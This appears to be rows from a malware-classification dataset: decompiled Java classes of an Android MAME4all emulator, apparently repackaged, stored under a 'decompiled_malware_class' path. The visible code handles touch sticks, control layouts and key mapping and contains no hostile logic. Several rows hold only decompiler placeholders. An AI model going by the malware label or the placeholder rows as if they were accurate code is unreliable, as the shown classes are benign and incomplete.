"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\AnalogStick.code","public class AnalogStick implements IController {   static BitmapDrawable inner_img=null;   static BitmapDrawable outer_img=null;   static BitmapDrawable[] stick_images=null;   float ang;   float mag;   float oldRx;   float oldRy;   float rx;   float ry;   int stickHeight;   int stickWidth;   float MY_PI=3.1415927f;   Rect rStickArea=new Rect();   Rect stickPos=new Rect();   Point ptCur=new Point();   Point ptCenter=new Point();   Point ptMin=new Point();   Point ptMax=new Point();   float deadZone=0.1f;   int motion_pid=-1;   protected MAME4all mm=null;   public final float rad2degree(  float r){     return (180.0f * r) / this.MY_PI;   }   public void setMAME4all(  MAME4all value){     this.mm=value;     if (inner_img == null) {       inner_img=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_inner);     }     if (outer_img == null) {       outer_img=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_outer);     }     if (stick_images == null) {       stick_images=new BitmapDrawable[9];       stick_images[7]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down);       stick_images[6]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down_left);       stick_images[8]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down_right);       stick_images[4]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_left);       stick_images[0]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_none);       stick_images[5]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_right);       stick_images[2]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up);       stick_images[1]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up_left);       stick_images[3]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up_right);     }   }   public void setStickArea(  Rect rStickArea){     this.rStickArea=rStickArea;     this.ptMin.x=rStickArea.left;     this.ptMin.y=rStickArea.top;     this.ptMax.x=rStickArea.right;     this.ptMax.y=rStickArea.bottom;     this.ptCenter.x=rStickArea.centerX();     this.ptCenter.y=rStickArea.centerY();     this.stickWidth=(int)(rStickArea.width() * 0.62f);     this.stickHeight=(int)(rStickArea.height() * 0.62f);     calculateStickPosition(this.ptCenter);   }   protected int updateAnalog(  int pad_data){ switch (this.mm.getPrefsHelper().getAnalogDZ()) { case 0:       this.deadZone=0.01f;     break; case 1:   this.deadZone=0.05f; break; case 2: this.deadZone=0.1f; break; case 3: this.deadZone=0.15f; break; case 4: this.deadZone=0.2f; break; case 5: this.deadZone=0.3f; break; } if (this.mag >= this.deadZone) { int ways=Emulator.getValue(6); boolean b=Emulator.isInMAME(); Emulator.setAnalogData(0,this.rx,this.ry * (-1.0f)); float v=this.ang; if (ways == 2 && b) { if (v < 180.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 180.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } return pad_data; } if (ways == 4 && b) { if (v >= 315.0f || v < 45.0f) { return (pad_data | 16) & (-2) & (-5)& (-65); } if (v >= 45.0f && v < 135.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 135.0f && v < 225.0f) { return (pad_data | 1) & (-17) & (-5)& (-65); } if (v >= 225.0f && v < 315.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } return pad_data; } if (v >= 330.0f || v < 30.0f) { return (pad_data | 16) & (-2) & (-5)& (-65); } if (v >= 30.0f && v < 60.0f) { return (pad_data | 16 | 64) & (-2) & (-5); } if (v >= 60.0f && v < 120.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 120.0f && v < 150.0f) { return (pad_data | 64 | 1) & (-17) & (-5); } if (v >= 150.0f && v < 210.0f) { return (pad_data | 1) & (-17) & (-5)& (-65); } if (v >= 210.0f && v < 240.0f) { return (pad_data | 1 | 4) & (-17) & (-65); } if (v >= 240.0f && v < 300.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } if (v >= 300.0f && v < 330.0f) { return (pad_data | 4 | 16) & (-2) & (-65); } return pad_data; } Emulator.setAnalogData(0,0.0f,0.0f); return pad_data & (-2) & (-17)& (-5)& (-65); } protected void calculateStickState(Point pt,Point min,Point max,Point center){ if (pt.x > max.x) { pt.x=max.x; } if (pt.x < min.x) { pt.x=min.x; } if (pt.y > max.y) { pt.y=max.y; } if (pt.y < min.y) { pt.y=min.y; } if (pt.x == center.x) { this.rx=0.0f; }  else if (pt.x >= center.x) { this.rx=(pt.x - center.x) / (max.x - center.x); }  else { this.rx=((pt.x - min.x) / (center.x - min.x)) - 1.0f; } if (pt.y == center.y) { this.ry=0.0f; }  else if (pt.y >= center.y) { this.ry=(pt.y - center.y) / (max.y - center.y); }  else { this.ry=((pt.y - min.y) / (center.y - min.y)) - 1.0f; } this.ang=rad2degree((float)Math.atan(this.ry / this.rx)); this.ang-=90.0f; if (this.rx < 0.0f) { this.ang-=180.0f; } this.ang=Math.abs(this.ang); this.mag=(float)Math.sqrt((this.rx * this.rx) + (this.ry * this.ry)); } protected void calculateStickPosition(Point pt){ int ways=Emulator.getValue(6); boolean b=Emulator.isInMAME(); if (ways == 2 && b) { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=this.ptCenter.y - (this.stickHeight / 2); }  else if (ways == 4 && b) { if (this.mm.getInputHandler().getStick_state() == 5 || this.mm.getInputHandler().getStick_state() == 4) { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=this.ptCenter.y - (this.stickHeight / 2); }  else { this.stickPos.left=this.ptCenter.x - (this.stickWidth / 2); this.stickPos.top=Math.min(this.ptMax.y - this.stickHeight,Math.max(this.ptMin.y,pt.y - (this.stickHeight / 2))); } }  else { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=Math.min(this.ptMax.y - this.stickHeight,Math.max(this.ptMin.y,pt.y - (this.stickHeight / 2))); } this.stickPos.right=this.stickPos.left + this.stickWidth; this.stickPos.bottom=this.stickPos.top + this.stickHeight; } public int handleMotion(MotionEvent event,int pad_data){ int pid; int action=event.getAction(); int actionEvent=action & 255; int pointerIndex=(65280 & action) >> 8; try { pid=event.getPointerId(pointerIndex); }  catch (Error e) { pid=(action & 8) >> 8; } if (actionEvent == 1 || ((actionEvent == 6 && pid == this.motion_pid) || actionEvent == 3)) { this.ptCur.x=this.ptCenter.x; this.ptCur.y=this.ptCenter.y; this.mag=0.0f; this.ry=0.0f; this.rx=0.0f; this.oldRy=-999.0f; this.oldRx=-999.0f; this.motion_pid=-1; }  else { for (int i=0; i < event.getPointerCount(); i++) { int pointerId=event.getPointerId(i); int x=(int)event.getX(i); int y=(int)event.getY(i); if (this.rStickArea.contains(x,y)) { this.motion_pid=pointerId; } if (this.motion_pid == pointerId) { this.ptCur.x=x; this.ptCur.y=y; calculateStickState(this.ptCur,this.ptMin,this.ptMax,this.ptCenter); } } } int pad_data2=updateAnalog(pad_data); if ((Math.abs(this.oldRx - this.rx) >= 0.08d || Math.abs(this.oldRy - this.ry) >= 0.08d) && this.mm.getPrefsHelper().isAnimatedInput()) { this.oldRx=this.rx; this.oldRy=this.ry; calculateStickPosition(this.mag >= this.deadZone ? this.ptCur : this.ptCenter); if (this.mm.getPrefsHelper().getControllerType() == 3) { if (Emulator.isDebug()) { this.mm.getInputView().invalidate(); }  else { this.mm.getInputView().invalidate(this.rStickArea); } } } return pad_data2; } public void draw(Canvas canvas){ if (this.mm.getPrefsHelper().getControllerType() == 3) { if (this.mm.getMainHelper().getscrOrientation() == 2) { outer_img.setBounds(this.rStickArea); outer_img.setAlpha(this.mm.getInputHandler().getOpacity()); outer_img.draw(canvas); } inner_img.setBounds(this.stickPos); inner_img.setAlpha(this.mm.getInputHandler().getOpacity()); inner_img.draw(canvas); }  else if (this.mm.getPrefsHelper().getControllerType() == 2) { stick_images[this.mm.getInputHandler().getStick_state()].setBounds(this.rStickArea); stick_images[this.mm.getInputHandler().getStick_state()].setAlpha(this.mm.getInputHandler().getOpacity()); stick_images[this.mm.getInputHandler().getStick_state()].draw(canvas); } if (Emulator.isDebug()) { canvas.drawText(""x="" + this.ptCur.x + "" y=""+ this.ptCur.y+ "" state=""+ this.mm.getInputHandler().getStick_state()+ "" rx=""+ this.rx+ "" ry=""+ this.ry+ "" ang=""+ this.ang+ "" mag=""+ this.mag,5.0f,50.0f,Emulator.getDebugPaint()); } } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\ControlCustomizer.code","public class ControlCustomizer {   private static boolean enabled=false;   private InputValue valueMoved=null;   private int ax=0;   private int ay=0;   private int old_ax=0;   private int old_ay=0;   private int prev_ax=0;   private int prev_ay=0;   protected MAME4all mm=null;   public static void setEnabled(  boolean enabled2){     enabled=enabled2;   }   public static boolean isEnabled(){     return enabled;   }   public void setMAME4all(  MAME4all value){     this.mm=value;   }   public void discardDefinedControlLayout(){     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       iv.setOffsetTMP(0,0);       if (iv.getType() == 8) {         this.mm.getInputHandler().getAnalogStick().setStickArea(iv.getRect());       }     }     this.mm.getInputView().updateImages();   }   public void saveDefinedControlLayout(){     StringBuffer definedStr=new StringBuffer();     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     boolean first=true;     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       iv.commitChanges();       if (iv.getXoff() != 0 || iv.getYoff() != 0) {         if (!first) {           definedStr.append("","");         }         definedStr.append(String.valueOf(iv.getType()) + "","" + iv.getValue()+ "",""+ iv.getXoff()+ "",""+ iv.getYoff());         first=false;       }     }     this.mm.getPrefsHelper().setDefinedControlLayout(definedStr.toString());   }   public void readDefinedControlLayout(){     if (this.mm.getMainHelper().getscrOrientation() == 2) {       String definedStr=this.mm.getPrefsHelper().getDefinedControlLayout();       if (definedStr != null) {         ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();         StringTokenizer tok=new StringTokenizer(definedStr,"","",false);         while (tok.hasMoreTokens()) {           int type=Integer.parseInt(tok.nextToken());           int value=Integer.parseInt(tok.nextToken());           int xoff=Integer.parseInt(tok.nextToken());           int yoff=Integer.parseInt(tok.nextToken());           for (int j=0; j < values.size(); j++) {             InputValue iv=values.get(j);             if (iv.getType() == type && iv.getValue() == value) {               iv.setOffset(xoff,yoff);               if (type == 8) {                 this.mm.getInputHandler().getAnalogStick().setStickArea(iv.getRect());               }             }           }         }       }       this.mm.getInputView().updateImages();     }   }   protected void updateRelatedRects(){     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     if (this.valueMoved.getType() == 3) {       for (int j=0; j < values.size(); j++) {         InputValue iv=values.get(j);         if (iv.getType() == 5 && iv.getValue() == this.valueMoved.getValue()) {           iv.setOffsetTMP(this.valueMoved.getXoff_tmp(),this.valueMoved.getYoff_tmp());           return;         }       }       return;     }     if (this.valueMoved.getType() == 4 || this.valueMoved.getType() == 8) {       for (int j2=0; j2 < values.size(); j2++) {         InputValue iv2=values.get(j2);         if (iv2.getType() == 2 || iv2.getType() == 4 || iv2.getType() == 8) {           iv2.setOffsetTMP(this.valueMoved.getXoff_tmp(),this.valueMoved.getYoff_tmp());         }         if (iv2.getType() == 8) {           this.mm.getInputHandler().getAnalogStick().setStickArea(this.valueMoved.getRect());         }       }     }   }   public void handleMotion(  MotionEvent event){     int action=event.getAction();     int x=(int)event.getX();     int y=(int)event.getY();     if (action == 1 || action == 3) {       this.valueMoved=null;       this.mm.getInputView().invalidate();       this.ax=0;       this.ay=0;       return;     }     if (this.valueMoved != null) {       int new_ax=((Math.abs((x - this.ax) - this.prev_ax) > 5 ? x - this.ax : 0) / 5) * 5;       int new_ay=((Math.abs((y - this.ay) - this.prev_ay) > 5 ? y - this.ay : 0) / 5) * 5;       if (new_ax != 0 || new_ay != 0) {         if (new_ax == 0) {           new_ax=this.prev_ax;         }         this.prev_ax=new_ax;         if (new_ay == 0) {           new_ay=this.prev_ay;         }         this.prev_ay=new_ay;         this.valueMoved.setOffsetTMP(this.prev_ax + this.old_ax,this.prev_ay + this.old_ay);         updateRelatedRects();         this.mm.getInputView().updateImages();         this.mm.getInputView().invalidate();         return;       }       return;     }     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       if (iv.getRect().contains(x,y) && (iv.getType() == 3 || iv.getType() == 4 || iv.getType() == 8)) {         this.old_ax=iv.getXoff_tmp();         this.old_ay=iv.getYoff_tmp();         this.ax=x;         this.ay=y;         this.valueMoved=iv;         return;       }     }   }   public void draw(  Canvas canvas){     ArrayList<InputValue> ids=this.mm.getInputHandler().getAllInputData();     Paint p2=new Paint();     p2.setARGB(30,255,255,255);     p2.setStyle(Paint.Style.FILL);     for (int i=0; i < ids.size(); i++) {       InputValue v=ids.get(i);       Rect r=v.getRect();       if (r != null) {         if (v.getType() == 3) {           canvas.drawRect(r,p2);         }  else         if (this.mm.getPrefsHelper().getControllerType() == 1 && v.getType() == 2) {           canvas.drawRect(r,p2);         }  else         if (this.mm.getPrefsHelper().getControllerType() != 1 && v.getType() == 8) {           canvas.drawRect(r,p2);         }       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\IController.code","public interface IController {   public static final int A_VALUE=4096;   public static final int BTN_A=1;   public static final int BTN_B=2;   public static final int BTN_L1=4;   public static final int BTN_L2=6;   public static final int BTN_NO_PRESS_STATE=1;   public static final int BTN_PRESS_STATE=0;   public static final int BTN_R1=5;   public static final int BTN_R2=7;   public static final int BTN_SELECT=8;   public static final int BTN_START=9;   public static final int BTN_X=3;   public static final int BTN_Y=0;   public static final int B_VALUE=8192;   public static final int DOWN_VALUE=16;   public static final int L1_VALUE=1024;   public static final int L2_VALUE=65536;   public static final int LEFT_VALUE=4;   public static final int NUM_BUTTONS=10;   public static final int R1_VALUE=2048;   public static final int R2_VALUE=131072;   public static final int RIGHT_VALUE=64;   public static final int SELECT_VALUE=512;   public static final int START_VALUE=256;   public static final int STICK_DOWN=7;   public static final int STICK_DOWN_LEFT=6;   public static final int STICK_DOWN_RIGHT=8;   public static final int STICK_LEFT=4;   public static final int STICK_NONE=0;   public static final int STICK_RIGHT=5;   public static final int STICK_UP=2;   public static final int STICK_UP_LEFT=1;   public static final int STICK_UP_RIGHT=3;   public static final int UP_VALUE=1;   public static final int X_VALUE=16384;   public static final int Y_VALUE=32768; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\InputHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@78a0bec"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\InputHandlerExt.code","!org.eclipse.jdt.core.dom.TypeDeclaration@11c79954"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\InputHandlerFactory.code","public class InputHandlerFactory {   public static InputHandler createInputHandler(  MAME4all mm){     try {       MotionEvent.class.getMethod(""getPointerCount"",new Class[0]);       return new InputHandlerExt(mm);     }  catch (    NoSuchMethodException e) {       return new InputHandler(mm);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\InputValue.code","public class InputValue {   private MAME4all mm;   private int o_x1;   private int o_x2;   private int o_y1;   private int o_y2;   private int type;   private int value;   private float dx=1.0f;   private float dy=1.0f;   private int ax=0;   private int ay=0;   private int xoff_tmp=0;   private int yoff_tmp=0;   private int xoff=0;   private int yoff=0;   private Rect rect=null;   private Rect origRect=null;   public InputValue(  int[] d,  MAME4all mm){     this.mm=null;     this.mm=mm;     this.type=d[0];     this.value=d[1];     if (this.type == 2 && mm.getPrefsHelper().isTouchDZ()) {       if (this.value == 4) {         d[4]=(int)(d[4] - (d[4] * 0.18f));       }       if (this.value == 5) {         d[2]=(int)(d[2] + (d[4] * 0.18f));         d[4]=(int)(d[4] - (d[4] * 0.18f));       }     }     this.o_x1=d[2];     this.o_y1=d[3];     this.o_x2=this.o_x1 + d[4];     this.o_y2=this.o_y1 + d[5];   }   public void setFixData(  float dx,  float dy,  int ax,  int ay){     this.dx=dx;     this.dy=dy;     this.ax=ax;     this.ay=ay;     this.rect=null;   }   public void setOffset(  int xoff,  int yoff){     this.xoff=xoff;     this.yoff=yoff;     this.xoff_tmp=0;     this.yoff_tmp=0;     this.rect=null;   }   public void setOffsetTMP(  int xoff_tmp,  int yoff_tmp){     this.xoff_tmp=xoff_tmp;     this.yoff_tmp=yoff_tmp;     this.rect=null;   }   public void commitChanges(){     this.xoff+=this.xoff_tmp;     this.yoff+=this.yoff_tmp;     this.xoff_tmp=0;     this.yoff_tmp=0;   }   public Rect getRect(){     if (this.rect == null) {       this.rect=new Rect(((int)(this.o_x1 * this.dx)) + this.ax + this.xoff+ this.xoff_tmp,((int)(this.o_y1 * this.dy)) + this.ay + this.yoff+ this.yoff_tmp,((int)(this.o_x2 * this.dx)) + this.ax + this.xoff+ this.xoff_tmp,((int)(this.o_y2 * this.dy)) + this.ay + this.yoff+ this.yoff_tmp);     }     return this.rect;   }   public Rect getOrigRect(){     if (this.origRect == null) {       this.origRect=new Rect(this.o_x1,this.o_y1,this.o_x2,this.o_y2);     }     return this.origRect;   }   public int getType(){     return this.type;   }   public int getValue(){     return this.value;   }   public int getXoff_tmp(){     return this.xoff_tmp;   }   public int getYoff_tmp(){     return this.yoff_tmp;   }   public int getXoff(){     return this.xoff;   }   public int getYoff(){     return this.yoff;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.input\TiltSensor.code","!org.eclipse.jdt.core.dom.TypeDeclaration@37db8b63"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\DefineKeys.code","public class DefineKeys extends ListActivity {   public static final String[] playerLabels={""Player 1"",""Player 2"",""Player 3"",""Player 4""};   protected int playerIndex=0;   @Override public void onCreate(  Bundle icicle){     super.onCreate(icicle);     getWindow().setFlags(4,4);     drawListAdapter();   }   private void drawListAdapter(){     ArrayAdapter<String> keyLabelsAdapter=new ArrayAdapter<String>(this,R.layout.simple_list_item_1,playerLabels){       @Override public View getView(      int position,      View convertView,      ViewGroup parent){         TextView textView=new TextView(this);         textView.setTextAppearance(this,com.game.breakrev.R.style.ListText);         textView.setText(getItem(position));         return textView;       }     } ;     setListAdapter(keyLabelsAdapter);   }   @Override public void onListItemClick(  ListView parent,  View v,  int position,  long id){     this.playerIndex=position;     startActivityForResult(new Intent(this,(Class<?>)ListKeys.class).putExtra(""playerIndex"",this.playerIndex),0);   }   @Override protected void onActivityResult(  int requestCode,  int resultCode,  Intent data){     super.onActivityResult(requestCode,resultCode,data);     drawListAdapter();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\KeySelect.code","public class KeySelect extends Activity {   protected int emulatorInputIndex;   @Override public void onCreate(  Bundle icicle){     super.onCreate(icicle);     this.emulatorInputIndex=getIntent().getIntExtra(""emulatorInputIndex"",0);     setTitle(""Press button for \"""" + ListKeys.emulatorInputLabels[this.emulatorInputIndex] + ""\"""");     Button chancelButton=new Button(this){ {         setText(""Cancel"");         setOnClickListener(new View.OnClickListener(){           @Override public void onClick(          View v){             KeySelect.this.setResult(0,new Intent());             KeySelect.this.finish();           }         } );       }     } ;     Button clearButton=new Button(this){ {         setText(""Clear"");         setOnClickListener(new View.OnClickListener(){           @Override public void onClick(          View v){             KeySelect.this.setResult(-1,new Intent().putExtra(""androidKeyCode"",-1));             KeySelect.this.finish();           }         } );       }     } ;     View primaryView=new View(this){ {         setLayoutParams(new ViewGroup.LayoutParams(-1,1));         setFocusable(true);         setFocusableInTouchMode(true);         requestFocus();       }       @Override public boolean onKeyDown(      int keyCode,      KeyEvent event){         KeySelect.this.setResult(-1,new Intent().putExtra(""androidKeyCode"",keyCode));         KeySelect.this.finish();         return true;       }     } ;     LinearLayout parentContainer=new LinearLayout(this,chancelButton,clearButton,primaryView){ {         setOrientation(1);         addView(chancelButton);         addView(clearButton);         addView(primaryView);       }     } ;     setContentView(parentContainer,new ViewGroup.LayoutParams(-1,-2));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\ListKeys.code","public class ListKeys extends ListActivity {   public static final String[] androidKeysLabels={""UNKNOWN"",""SOFT_LEFT"",""SOFT_RIGHT"",""HOME"",""BACK"",""CALL"",""ENDCALL"",""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""STAR"",""POUND"",""DPAD_UP"",""DPAD_DOWN"",""DPAD_LEFT"",""DPAD_RIGHT"",""DPAD_CENTER"",""VOLUME_UP"",""VOLUME_DOWN"",""POWER"",""CAMERA"",""CLEAR"",""A"",""B"",""C"",""D"",""E"",""F"",""G"",""H"",""I"",""J"",""K"",""L"",""M"",""N"",""O"",""P"",""Q"",""R"",""S"",""T"",""U"",""V"",""W"",""X"",""Y"",""Z"",""COMMA"",""PERIOD"",""ALT_LEFT"",""ALT_RIGHT"",""SHIFT_LEFT"",""SHIFT_RIGHT"",""TAB"",""SPACE"",""SYM"",""EXPLORER"",""ENVELOPE"",""ENTER"",""DEL"",""GRAVE"",""MINUS"",""EQUALS"",""LEFT_BRACKET"",""RIGHT_BRACKET"",""BACKSLASH"",""SEMICOLON"",""APOSTROPHE"",""SLASH"",""AT"",""NUM"",""HEADSETHOOK"",""FOCUS"",""PLUS"",""MENU"",""NOTIFICATION"",""SEARCH"",""MEDIA_PLAY_PAUSE"",""MEDIA_STOP"",""MEDIA_NEXT"",""MEDIA_PREVIOUS"",""MEDIA_REWIND"",""MEDIA_FAST_FORWARD"",""MUTE"",""PAGE_UP"",""PAGE_DOWN"",""PICTSYMBOLS"",""SWITCH_CHARSET"",""BUTTON_A"",""BUTTON_B"",""BUTTON_C"",""BUTTON_X"",""BUTTON_Y"",""BUTTON_Z"",""BUTTON_L1"",""BUTTON_R1"",""BUTTON_L2"",""BUTTON_R2"",""BUTTON_THUMBL"",""BUTTON_THUMBR"",""BUTTON_START"",""BUTTON_SELECT"",""BUTTON_MODE"",""ESCAPE"",""FORWARD_DEL"",""CTRL_LEFT"",""CTRL_RIGHT"",""CAPS_LOCK"",""SCROLL_LOCK"",""META_LEFT"",""META_RIGHT"",""FUNCTION"",""SYSRQ"",""BREAK"",""MOVE_HOME"",""MOVE_END"",""INSERT"",""FORWARD"",""MEDIA_PLAY"",""MEDIA_PAUSE"",""MEDIA_CLOSE"",""MEDIA_EJECT"",""MEDIA_RECORD"",""F1"",""F2"",""F3"",""F4"",""F5"",""F6"",""F7"",""F8"",""F9"",""F10"",""F11"",""F12"",""NUM_LOCK"",""NUMPAD_0"",""NUMPAD_1"",""NUMPAD_2"",""NUMPAD_3"",""NUMPAD_4"",""NUMPAD_5"",""NUMPAD_6"",""NUMPAD_7"",""NUMPAD_8"",""NUMPAD_9"",""NUMPAD_DIVIDE"",""NUMPAD_MULTIPLY"",""NUMPAD_SUBTRACT"",""NUMPAD_ADD"",""NUMPAD_DOT"",""NUMPAD_COMMA"",""NUMPAD_ENTER"",""NUMPAD_EQUALS"",""NUMPAD_LEFT_PAREN"",""NUMPAD_RIGHT_PAREN"",""VOLUME_MUTE"",""INFO"",""CHANNEL_UP"",""CHANNEL_DOWN"",""ZOOM_IN"",""ZOOM_OUT"",""TV"",""WINDOW"",""GUIDE"",""DVR"",""BOOKMARK"",""CAPTIONS"",""SETTINGS"",""TV_POWER"",""TV_INPUT"",""STB_POWER"",""STB_INPUT"",""AVR_POWER"",""AVR_INPUT"",""PROG_RED"",""PROG_GREEN"",""PROG_YELLOW"",""PROG_BLUE"",""APP_SWITCH"",""BUTTON_1"",""BUTTON_2"",""BUTTON_3"",""BUTTON_4"",""BUTTON_5"",""BUTTON_6"",""BUTTON_7"",""BUTTON_8"",""BUTTON_9"",""BUTTON_10"",""BUTTON_11"",""BUTTON_12"",""BUTTON_13"",""BUTTON_14"",""BUTTON_15"",""BUTTON_16""};   public static final String[] emulatorInputLabels={""STICK UP"",""STICK DOWN"",""STICK LEFT"",""STICK RIGHT"",""STICK B"",""STICK X"",""STICK A"",""STICK Y"",""STICK L1"",""STICK R1"",""STICK SELECT"",""STICK START"",""EXIT"",""OPTION""};   protected int emulatorInputIndex=0;   protected int playerIndex=0;   @Override public void onCreate(  Bundle icicle){     super.onCreate(icicle);     getWindow().setFlags(4,4);     this.playerIndex=getIntent().getIntExtra(""playerIndex"",0);     setTitle(""MAME4droid Player "" + (this.playerIndex + 1) + "" keys"");     drawListAdapter();   }   private void drawListAdapter(){     ArrayAdapter<String> keyLabelsAdapter=new ArrayAdapter<String>(this,R.layout.simple_list_item_1,emulatorInputLabels){       @Override public View getView(      int position,      View convertView,      ViewGroup parent){         return new Modified(this,getItem(position),(ListKeys.this.playerIndex * ListKeys.emulatorInputLabels.length) + position);       }     } ;     setListAdapter(keyLabelsAdapter);   }   @Override public void onListItemClick(  ListView parent,  View v,  int position,  long id){     this.emulatorInputIndex=position;     startActivityForResult(new Intent(this,(Class<?>)KeySelect.class).putExtra(""emulatorInputIndex"",this.emulatorInputIndex),0);   }   @Override protected void onActivityResult(  int requestCode,  int resultCode,  Intent data){     super.onActivityResult(requestCode,resultCode,data);     if (resultCode == -1 && requestCode == 0) {       int androidKeyCode=data.getIntExtra(""androidKeyCode"",0);       for (int i=0; i < InputHandler.keyMapping.length; i++) {         if (InputHandler.keyMapping[i] == androidKeyCode) {           InputHandler.keyMapping[i]=-1;         }       }       InputHandler.keyMapping[(this.playerIndex * emulatorInputLabels.length) + this.emulatorInputIndex]=androidKeyCode;     }     drawListAdapter();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\Modified.code","class Modified extends LinearLayout {   public Modified(  Context context,  String keyLabel,  int position){     super(context);     if (keyLabel != null) {       setOrientation(0);       TextView textView=new TextView(context);       textView.setTextAppearance(context,R.style.ListText);       TextView textView2=new TextView(context);       textView2.setTextAppearance(context,R.style.ListTextSmall);       textView.setText(keyLabel);       textView.setPadding(10,0,0,0);       textView2.setText(""?"");       if (InputHandler.keyMapping[position] != -1) {         textView2.setText(ListKeys.androidKeysLabels[InputHandler.keyMapping[position]]);       }       textView2.setGravity(5);       textView2.setPadding(0,0,10,0);       addView(textView,new LinearLayout.LayoutParams(-2,-2));       addView(textView2,new LinearLayout.LayoutParams(-1,-2));       return;     }     View hiddenView=new View(context);     hiddenView.setVisibility(4);     addView(hiddenView,new LinearLayout.LayoutParams(0,0));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\SensitivityPrefScreen.code","public class SensitivityPrefScreen extends DialogPreference implements SeekBar.OnSeekBarChangeListener {   private int maxValue;   private int minValue;   private int newValue;   private int oldValue;   private SeekBar seekBar;   private TextView valueView;   public SensitivityPrefScreen(  Context context,  AttributeSet attrs){     super(context,attrs);     this.minValue=1;     this.maxValue=10;     setDialogLayoutResource(R.layout.bar);     setPositiveButtonText(""Save"");     setNegativeButtonText(""Cancel"");   }   @Override protected void onBindDialogView(  View view){     super.onBindDialogView(view);     if (this.newValue < this.minValue) {       this.newValue=this.minValue;     }     if (this.newValue > this.maxValue) {       this.newValue=this.maxValue;     }     this.seekBar=(SeekBar)view.findViewById(R.id.seekbar);     this.seekBar.setMax(this.maxValue - this.minValue);     this.seekBar.setProgress(this.newValue - this.minValue);     this.seekBar.setSecondaryProgress(this.newValue - this.minValue);     this.seekBar.setOnSeekBarChangeListener(this);     this.valueView=(TextView)view.findViewById(R.id.value);     this.valueView.setText(Integer.toString(this.newValue));   }   @Override public void onProgressChanged(  SeekBar seekBar,  int progress,  boolean fromUser){     this.newValue=this.minValue + progress;     this.valueView.setText(Integer.toString(this.newValue));   }   @Override public void onStartTrackingTouch(  SeekBar seekBar){   }   @Override public void onStopTrackingTouch(  SeekBar seekBar){   }   @Override protected void onDialogClosed(  boolean positiveResult){     super.onDialogClosed(positiveResult);     if (!positiveResult) {       this.newValue=this.oldValue;     }  else {       this.oldValue=this.newValue;       persistInt(this.newValue);     }   }   @Override protected Object onGetDefaultValue(  TypedArray a,  int index){     return Integer.valueOf(a.getInteger(index,0));   }   @Override protected void onSetInitialValue(  boolean restoreValue,  Object defaultValue){     this.oldValue=restoreValue ? getPersistedInt(0) : ((Integer)defaultValue).intValue();     this.newValue=this.oldValue;   } } "
